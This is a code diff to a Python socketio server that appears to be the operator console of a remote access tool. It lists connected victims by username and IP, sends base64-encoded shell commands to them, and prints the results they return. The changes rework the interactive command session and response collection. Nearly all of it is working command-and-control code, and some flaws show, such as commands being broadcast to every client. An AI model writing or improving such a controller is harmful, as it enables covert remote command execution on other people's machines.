@@ -1,4 +1,4 @@
-import socketio, flask, json, os, threading, time, waitress, logging, base64
+import socketio, flask, json, os, threading, time, waitress, logging, base64, sys
 log = logging.getLogger("werkzeug")
 log.setLevel(logging.ERROR)
 
@@ -8,6 +8,14 @@ app.secret_key = os.urandom(32).hex()
 app.wsgi_app = socketio.WSGIApp(socket, app.wsgi_app)
 
 clients = []
+responses = []
+
+@socket.event
+def result(sid, message):
+    for client in clients:
+        if client["sid"] == sid:
+            decoded_msg = base64.b64decode(json.loads(message)["result"]).decode()
+            responses.append({"sid": sid, "message": decoded_msg, "cmd": json.loads(message)["cmd"]})
 
 @socket.on("connect")
 def connect(sid, data):
@@ -18,14 +26,6 @@ def disconnect(sid):
     for client in clients:
         if client["sid"] == sid:
             clients.remove(client)
-
-@socket.event
-def result(sid, message):
-    decoded_msg = base64.b64decode(message).decode()
-    for client in clients:
-        if client["sid"] == sid:
-            client["result"] == str(decoded_msg)
-            print("Set result to: ", str(decoded_msg))
 
 @socket.event
 def init(sid, message):
@@ -40,9 +40,9 @@ os.system("clear")
 
 while True:
     commands = ["clients", "connect"]
-    cmd = input("> ")
+    cmd = input("[server.py]: ")
     if cmd.split(" ")[0] not in commands:
-        print("Command not found")
+        print("[!] Command not found")
     
     if cmd == "clients":
         for i in range(len(clients)):
@@ -50,21 +50,38 @@ while True:
             print(f"[{i}] {client['username']}@{client['ip']}")
         
         if not clients:
-            print("No clients found")
+            print("[!] No clients found")
 
     if cmd.split(" ")[0] == "connect":
         if len(cmd.split(" ")) > 1:
             client_select = int(cmd.split(" ")[1])
-            client = clients[client_select]
             try:
-                sess_cmd = input(f"{client['username']}@{client['ip']} > ")
-                socket.emit("command", base64.b64encode(sess_cmd.encode()))
+                client = clients[client_select]
+            except:
+                print("[!] Client does not exists")
+                continue
+            try:
                 while True:
-                    if client.get("result", None):
-                        client["result"] = None
-                        break
-                    time.sleep(0.3)
+                    sess_cmd = input(f"[{client['username']}@{client['ip']}]: ")
+                    if not sess_cmd:
+                        continue
+
+                    socket.emit("command", base64.b64encode(sess_cmd.encode()))
+
+                    while not client["sid"] in [x["sid"] for x in responses]:
+                        pass
+
+                    while not sess_cmd in [x["cmd"] for x in responses]:
+                        pass
+
+                    for response in responses:
+                        if response["sid"] == client["sid"]:
+                            if response["cmd"] == sess_cmd:
+                                print(response["message"])
+                                responses.remove(response)
+
+
             except KeyboardInterrupt:
-                print("Exiting session")
+                print("\n[!] Exiting session")
         else:
-            print("Please select a valid client")
+            print("[!] Please select a valid client")
